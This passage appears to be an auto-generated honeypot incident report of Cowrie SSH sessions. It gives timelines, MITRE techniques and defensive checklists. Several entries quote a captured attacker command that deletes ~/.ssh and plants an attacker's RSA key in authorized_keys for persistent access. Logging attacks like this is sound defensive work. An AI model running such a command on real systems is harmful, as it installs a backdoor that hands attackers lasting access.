| `2026-05-03 21:10:03` | `cowrie.session.connect` |
| `2026-05-03 21:10:03` | `cowrie.client.version` |
| `2026-05-03 21:10:03` | `cowrie.client.kex` |
| `2026-05-03 21:10:04` | `cowrie.login.success` |
| `2026-05-03 21:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993356995185

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:10 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:10:55` | `cowrie.session.connect` |
| `2026-05-03 21:10:55` | `cowrie.client.version` |
| `2026-05-03 21:10:55` | `cowrie.client.kex` |
| `2026-05-03 21:10:56` | `cowrie.login.success` |
| `2026-05-03 21:10:56` | `cowrie.session.params` |
| `2026-05-03 21:10:56` | `cowrie.command.input` |
| `2026-05-03 21:10:56` | `cowrie.command.failed` |
| `2026-05-03 21:10:56` | `cowrie.log.closed` |
| `2026-05-03 21:10:56` | `cowrie.session.params` |
| `2026-05-03 21:10:56` | `cowrie.command.input` |
| `2026-05-03 21:10:57` | `cowrie.session.file_download` |
| `2026-05-03 21:10:57` | `cowrie.log.closed` |
| `2026-05-03 21:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5357f65baca

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:10 |
| **Last Seen** | 2026-05-03 21:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:10:58` | `cowrie.session.connect` |
| `2026-05-03 21:10:58` | `cowrie.client.version` |
| `2026-05-03 21:10:59` | `cowrie.client.kex` |
| `2026-05-03 21:10:59` | `cowrie.login.success` |
| `2026-05-03 21:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fea0db18160

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:11 |
| **Last Seen** | 2026-05-03 21:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:11:47` | `cowrie.session.connect` |
| `2026-05-03 21:11:47` | `cowrie.client.version` |
| `2026-05-03 21:11:48` | `cowrie.client.kex` |
| `2026-05-03 21:11:48` | `cowrie.login.success` |
| `2026-05-03 21:11:48` | `cowrie.session.params` |
| `2026-05-03 21:11:48` | `cowrie.command.input` |
| `2026-05-03 21:11:48` | `cowrie.command.failed` |
| `2026-05-03 21:11:48` | `cowrie.log.closed` |
| `2026-05-03 21:11:49` | `cowrie.session.params` |
| `2026-05-03 21:11:49` | `cowrie.command.input` |
| `2026-05-03 21:11:49` | `cowrie.session.file_download` |
| `2026-05-03 21:11:49` | `cowrie.log.closed` |
| `2026-05-03 21:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-197a87adc35c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:11 |
| **Last Seen** | 2026-05-03 21:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:11:51` | `cowrie.session.connect` |
| `2026-05-03 21:11:51` | `cowrie.client.version` |
| `2026-05-03 21:11:51` | `cowrie.client.kex` |
| `2026-05-03 21:11:51` | `cowrie.login.success` |
| `2026-05-03 21:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c69f34a8ee50

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:13 |
| **Last Seen** | 2026-05-03 21:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:13:38` | `cowrie.session.connect` |
| `2026-05-03 21:13:38` | `cowrie.client.version` |
| `2026-05-03 21:13:38` | `cowrie.client.kex` |
| `2026-05-03 21:13:38` | `cowrie.login.success` |
| `2026-05-03 21:13:38` | `cowrie.session.params` |
| `2026-05-03 21:13:38` | `cowrie.command.input` |
| `2026-05-03 21:13:38` | `cowrie.command.failed` |
| `2026-05-03 21:13:39` | `cowrie.log.closed` |
| `2026-05-03 21:13:39` | `cowrie.session.params` |
| `2026-05-03 21:13:39` | `cowrie.command.input` |
| `2026-05-03 21:13:39` | `cowrie.session.file_download` |
| `2026-05-03 21:13:39` | `cowrie.log.closed` |
| `2026-05-03 21:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7784f84f2c8f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:13 |
| **Last Seen** | 2026-05-03 21:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:13:41` | `cowrie.session.connect` |
| `2026-05-03 21:13:41` | `cowrie.client.version` |
| `2026-05-03 21:13:41` | `cowrie.client.kex` |
| `2026-05-03 21:13:41` | `cowrie.login.success` |
| `2026-05-03 21:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327dbf908158

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:15 |
| **Last Seen** | 2026-05-03 21:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:15:24` | `cowrie.session.connect` |
| `2026-05-03 21:15:24` | `cowrie.client.version` |
| `2026-05-03 21:15:24` | `cowrie.client.kex` |
| `2026-05-03 21:15:25` | `cowrie.login.success` |
| `2026-05-03 21:15:25` | `cowrie.session.params` |
| `2026-05-03 21:15:25` | `cowrie.command.input` |
| `2026-05-03 21:15:25` | `cowrie.command.failed` |
| `2026-05-03 21:15:25` | `cowrie.log.closed` |
| `2026-05-03 21:15:25` | `cowrie.session.params` |
| `2026-05-03 21:15:25` | `cowrie.command.input` |
| `2026-05-03 21:15:25` | `cowrie.session.file_download` |
| `2026-05-03 21:15:25` | `cowrie.log.closed` |
| `2026-05-03 21:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6fbef04d26

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:15 |
| **Last Seen** | 2026-05-03 21:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:15:27` | `cowrie.session.connect` |
| `2026-05-03 21:15:27` | `cowrie.client.version` |
| `2026-05-03 21:15:27` | `cowrie.client.kex` |
| `2026-05-03 21:15:28` | `cowrie.login.success` |
| `2026-05-03 21:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389cc67792fe

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:16 |
| **Last Seen** | 2026-05-03 21:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:16:17` | `cowrie.session.connect` |
| `2026-05-03 21:16:17` | `cowrie.client.version` |
| `2026-05-03 21:16:17` | `cowrie.client.kex` |
| `2026-05-03 21:16:18` | `cowrie.login.success` |
| `2026-05-03 21:16:18` | `cowrie.session.params` |
| `2026-05-03 21:16:18` | `cowrie.command.input` |
| `2026-05-03 21:16:18` | `cowrie.command.failed` |
| `2026-05-03 21:16:18` | `cowrie.log.closed` |
| `2026-05-03 21:16:18` | `cowrie.session.params` |
| `2026-05-03 21:16:18` | `cowrie.command.input` |
| `2026-05-03 21:16:18` | `cowrie.session.file_download` |
| `2026-05-03 21:16:18` | `cowrie.log.closed` |
| `2026-05-03 21:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51bc1208c84b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:16 |
| **Last Seen** | 2026-05-03 21:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:16:20` | `cowrie.session.connect` |
| `2026-05-03 21:16:20` | `cowrie.client.version` |
| `2026-05-03 21:16:20` | `cowrie.client.kex` |
| `2026-05-03 21:16:21` | `cowrie.login.success` |
| `2026-05-03 21:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5663cb463d0e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:17 |
| **Last Seen** | 2026-05-03 21:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:17:11` | `cowrie.session.connect` |
| `2026-05-03 21:17:11` | `cowrie.client.version` |
| `2026-05-03 21:17:11` | `cowrie.client.kex` |
| `2026-05-03 21:17:11` | `cowrie.login.success` |
| `2026-05-03 21:17:11` | `cowrie.session.params` |
| `2026-05-03 21:17:11` | `cowrie.command.input` |
| `2026-05-03 21:17:11` | `cowrie.command.failed` |
| `2026-05-03 21:17:12` | `cowrie.log.closed` |
| `2026-05-03 21:17:12` | `cowrie.session.params` |
| `2026-05-03 21:17:12` | `cowrie.command.input` |
| `2026-05-03 21:17:12` | `cowrie.session.file_download` |
| `2026-05-03 21:17:12` | `cowrie.log.closed` |
| `2026-05-03 21:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7673f5943aed

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:17 |
| **Last Seen** | 2026-05-03 21:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:17:14` | `cowrie.session.connect` |
| `2026-05-03 21:17:14` | `cowrie.client.version` |
| `2026-05-03 21:17:14` | `cowrie.client.kex` |
| `2026-05-03 21:17:14` | `cowrie.login.success` |
| `2026-05-03 21:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8246e5b295d4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:18 |
| **Last Seen** | 2026-05-03 21:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:18:03` | `cowrie.session.connect` |
| `2026-05-03 21:18:03` | `cowrie.client.version` |
| `2026-05-03 21:18:03` | `cowrie.client.kex` |
| `2026-05-03 21:18:04` | `cowrie.login.success` |
| `2026-05-03 21:18:04` | `cowrie.session.params` |
| `2026-05-03 21:18:04` | `cowrie.command.input` |
| `2026-05-03 21:18:04` | `cowrie.command.failed` |
| `2026-05-03 21:18:04` | `cowrie.log.closed` |
| `2026-05-03 21:18:04` | `cowrie.session.params` |
| `2026-05-03 21:18:04` | `cowrie.command.input` |
| `2026-05-03 21:18:05` | `cowrie.session.file_download` |
| `2026-05-03 21:18:05` | `cowrie.log.closed` |
| `2026-05-03 21:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a576fd6c82

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:18 |
| **Last Seen** | 2026-05-03 21:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:18:06` | `cowrie.session.connect` |
| `2026-05-03 21:18:06` | `cowrie.client.version` |
| `2026-05-03 21:18:06` | `cowrie.client.kex` |
| `2026-05-03 21:18:07` | `cowrie.login.success` |
| `2026-05-03 21:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc0f260faad

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:19 |
| **Last Seen** | 2026-05-03 21:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:19:53` | `cowrie.session.connect` |
| `2026-05-03 21:19:53` | `cowrie.client.version` |
| `2026-05-03 21:19:53` | `cowrie.client.kex` |
| `2026-05-03 21:19:54` | `cowrie.login.success` |
| `2026-05-03 21:19:54` | `cowrie.session.params` |
| `2026-05-03 21:19:54` | `cowrie.command.input` |
| `2026-05-03 21:19:54` | `cowrie.command.failed` |
| `2026-05-03 21:19:54` | `cowrie.log.closed` |
| `2026-05-03 21:19:54` | `cowrie.session.params` |
| `2026-05-03 21:19:54` | `cowrie.command.input` |
| `2026-05-03 21:19:54` | `cowrie.session.file_download` |
| `2026-05-03 21:19:54` | `cowrie.log.closed` |
| `2026-05-03 21:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7227002617c5

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:19 |
| **Last Seen** | 2026-05-03 21:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:19:55` | `cowrie.session.connect` |
| `2026-05-03 21:19:55` | `cowrie.client.version` |
| `2026-05-03 21:19:55` | `cowrie.client.kex` |
| `2026-05-03 21:19:56` | `cowrie.login.success` |
| `2026-05-03 21:19:57` | `cowrie.session.params` |
| `2026-05-03 21:19:57` | `cowrie.command.input` |
| `2026-05-03 21:19:57` | `cowrie.command.failed` |
| `2026-05-03 21:19:57` | `cowrie.log.closed` |
